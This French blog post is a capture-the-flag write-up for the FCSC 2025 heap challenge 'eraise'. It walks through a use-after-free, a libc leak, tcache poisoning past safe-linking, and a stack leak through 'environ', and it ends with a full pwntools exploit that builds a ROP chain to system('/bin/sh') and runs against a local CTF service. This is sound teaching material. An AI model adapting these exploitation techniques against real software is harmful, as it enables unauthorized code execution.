---
layout: post  
title: "Challenge eraise, FCSC 2025"
date: 2026-02-11 14:03:56 +0100
categories: CTF
---

# Challenge: eraise
[https://hackropole.fr/fr/challenges/pwn/fcsc2025-pwn-eraise/](https://hackropole.fr/fr/challenges/pwn/fcsc2025-pwn-eraise/)

Il s'agit d'une application pour allouer et libérer de la mémoire, on part donc sur une vulnérabilité de heap.  
Effectivement en tatonnant on s'apercoit rapidement qu'on peut éditer un slot libéré.
La technique à utiliser est le [use after free](https://en.wikipedia.org/wiki/Use-after-free).

Pour travailler en local j'utilise pwninit, qui crée une version de la cible qui utilise la libc du repertoire.
D'où le eraise_patched de l'exploit en local.

La désassemblage du binaire avec binaryninja nous indique que les pointeurs vers les élements "employés" sont stockés dans un tableau.  
Le pointeur vers ce tableau est stocké dans la section .bss, à l'adresse &team+0x40.  
Il est aussi stocké dans la variable var\_c8 dans main().

On peut voir qu'il y a une autre variable sur la pile (renommée isboss) qui conditionne l'accès à un shell:
```
+0x22fd case 5  
+0x22fd   if (isboss != 0)  
+0x2322   char line[0x88]  
+0x2322   read_string(&line, 0x80)  
+0x2331   system(&line)  
+0x2336   continue
```

Je n'ai jamais réussi à l'écraser, ni à sauter à cette adresse..  
Soit c'est une fausse piste ou plus probablement ma solution n'est pas celle attendue..

Le début du problème nous offre un leak, celui de l'adresse de libc, si le login est contigu au mot de passe.  
En affichant le login "welcome back" il affiche ce qu'il y a derrière jusqu'au premier null.

Retour à l'UAF.  
Il y a 10 slots dans la table pour les employés, ils ne sont pas remis à zéro quand on en libère un.

```c
+0x1dd7 int64\_t rax\_3 = \*(tableemployes + (arg1 \<\< 3))  
+0x1dd7  
+0x1de3 if (rax\_3 != 0)  
+0x1e04   free(mem: rax\_3)  
+0x1e09   return 1  
+0x1e09
```

On libère bien le bloc mémoire, mais pas le pointeur vers l'employé dans la table. D'où le use after free.  
On peut s'en rendre compte en "employant" 10 personnes, puis en les libérant toutes, on ne peut plus en rembaucher.

On va exploiter l'UAF pour polluer la chaine tcache, et allouer un faux chunk qui pointe vers ce qui nous arrange, pour y lire ou écrire.
Ca a été beaucoup décrit, mais voici un rappel :

*   on alloue 2 chunks de mémoire
*   on les libère
*   à ce stade les blocs libérés contiennent des informations:  
    Un pointeur vers le prochain bloc libre ou null, masqué par une opération xor avec l'adresse de la base de la heap décalée de 12 bits.  
    Il est suivi par un qword qui sert à reconnaitre un bloc libéré. C'est utilisé pour détecter les [double free](https://owasp.org/www-community/vulnerabilities/Doubly_freeing_memory) par glibc.
*   comme les pointeurs vers ces blocs sont toujours utilisables, on peut y lire et y écrire via le programme.
*   on s'en sert pour lire le prochain pointeur (null xoré par l'adresse de la heap), on en déduit l'adresse de la heap !
*   on peut ensuite choisir où l'on veut écrire en remplacant ce pointeur par une adresse choisie (xorée)
*   on réalloue un bloc. glibc prend le pointeur empoisonné, et le renvoie au programme.
*   via le programme on peut y écrire ('First name')

Maintenant qu'on peut écrire, quoi écrire, et où ?  
La libc est récente, 2.40, \_\_free\_hook n'est plus utilisé, les binaires sont RELRO on ne peut pas utiliser leur .got .  
On ne connait pas l'adresse en mémoire du programme de toute facon. Ni celle de la pile.

Solution en deux temps (deux UAF); trouver l'adresse de la pile, puis écrire dedans.  
Le plus "simple" que j'ai trouvé est d'écrire dans la table des employés l'adresse de la variable 'environ' dans la libc.  
Cette variable garde l'adresse de la table des variables d'environnement, qui est dans la pile.  
Une fois récupérée on calcul la distance à l'adresse de retour de la fonction qu'on a récupéré dans gdb.  
On fait le deuxième UAF pour y écrire.  
J'ai essayé les one gadget disponibles (adresses dans libc qui donne un shell), mais les contraintes n'étaient pas remplies.  
J'ai donc fait du [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) avec les gadgets disponibles.

```bash
➜  eraise ./exploit.py REMOTE
[+] Opening connection to 127.0.0.1 on port 4000: Done
[+] libc.address  0x70c68e573000
[+] heap base     0x5717977e9000
[*] Will attempt to write 0x70c68e78bd78 at 0x5717977e92a0
[*] get *environ
[+] stack.environ offset 0x7ffcef84d948
[*] Will attempt to write a ROP chain at 0x7ffcef84d700
[*] Loaded 116 cached gadgets for './libc-2.40.so'
[*] Switching to interactive mode
Linux 4747472fd454 6.8.0-90-generic #91-Ubuntu SMP PREEMPT_DYNAMIC Tue Nov 18 14:14:30 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
$ id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
```

 - mandragore / 20260211

```python
#!/usr/bin/env python3

from pwn import *
import sys
sys.tracebacklimit = 0  # yeah I know it crashed

context.arch = 'amd64'

if args.DBG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

elf = ELF('./eraise_patched', checksec=False)
libc=ELF('./libc-2.40.so',checksec=False)

if args.REMOTE:
    p=remote('127.0.0.1',4000)
else:
    p = process(elf.path)
    if args.GDB:
        gdb.attach(p, gdbscript='''
        # break printf
        # pie break 0x20d4
        continue
        ''')

def allocchunk(what=cyclic(20)):
    p.sendline(b'1')
    p.sendlineafter(b'First name:         ',what)
    p.sendlineafter(b'Last name:          ',cyclic(20))
    p.sendlineafter(b'Experience (years): ',b'123')
    p.recvuntil(b'>>> ')

def freechunk(idx):
    p.sendline(b'2')
    p.sendlineafter(b'fire?\n',str(idx).encode())
    p.recvuntil(b'>>> ')

def leakchunk(idx):
    p.sendline(b'3')
    p.sendlineafter(b'check?\n',str(idx).encode())
    leak=p.recvuntil(b'>>> ')
    return leak

def editchunk(idx,where):
    p.sendline(b'4')
    p.sendlineafter(b'edit?\n',str(idx).encode())
    p.sendlineafter(b'First name:         ',where)
    p.sendlineafter(b'Last name:          ',cyclic(20))
    p.sendlineafter(b'Experience (years): ',b'123')
    p.recvuntil(b'>>> ')


p.sendafter(b'Login:\n',b'manager-'+cyclic(16))
p.sendafter(b'Password:\n',b'KjAqD2kZjV9Ft5osLS92621x')

leak=p.recvuntil(b'>>> ')
leak=u64(leak[0x26:0x2c]+b'\x00\x00')
libc.address=leak-libc.sym.__GI__IO_setbuffer-203
log.success(f'libc.address  {libc.address:#x}')

allocchunk()    # employé 0
allocchunk()    # employé 1
freechunk(0)    # crée le chunk 0 dans tcachebins
freechunk(1)    # crée le chunk 1 dans tcachebins

leak=leakchunk(0)
leak=u64(leak[9:17])
leak=leak & 0xffffffffff
heapbase=leak << 12
log.success(f'heap base     {heapbase:#x}')

# -------------- modifie un pointeur dans la table des employés (*(&team+0x40))

where=heapbase+0x2a0 # &employé[0]
what=libc.sym.environ
log.info(f'Will attempt to write {what:#x} at {where:#x}')
try:
    assert (where & 0xf) == 0             # libc alignment
except:
    log.critical('chunk alignment not %16')
    exit()
where^=(heapbase>>12) 				# Safe Linking glib >=2.32 protection
editchunk(1,p64(where))

allocchunk()            # tcache_count = 1
allocchunk(p64(what))   # tcache_count = 0

# --------------- leak les donnees au nouveau pointeur
log.info('get *environ')
leak=leakchunk(0)
leak=u64(leak[9:15]+b'\x00\x00')
stackenvoff=leak
log.success(f'stack.environ offset {stackenvoff:#x}')

# -------------- nouveau ptr dans la pile

allocchunk()    # chunck 2, sera employé 1
allocchunk()    # chunck 3, sera employé 4
freechunk(1)    # tcache count = 1
freechunk(4)    # tcache count = 2

where=stackenvoff-(0x00007ffc71891be8-0x7ffc718919a8) - 0x8 # alignement..
log.info(f'Will attempt to write a ROP chain at {where:#x}')
try:
    assert (where & 0xf) == 0             # libc alignment
except:
    log.critical('chunk alignment not %16')
    exit()
where^=(heapbase>>12) 				# Safe Linking glib >=2.32 protection
editchunk(4,p64(where))

rop=ROP([libc])
rop.raw(rop.ret.address)
rop.call('system', [next(libc.search(b'/bin/sh'))])

allocchunk()
# fasten your seatbelts
p.sendline(b'1')
p.sendlineafter(b'First name:         ',p64(0)+rop.chain())
p.sendlineafter(b'Last name:          ',b'openthedoor')
p.sendlineafter(b'Experience (years): ',b'1337')

p.sendline(b'uname -a')
p.interactive()

```
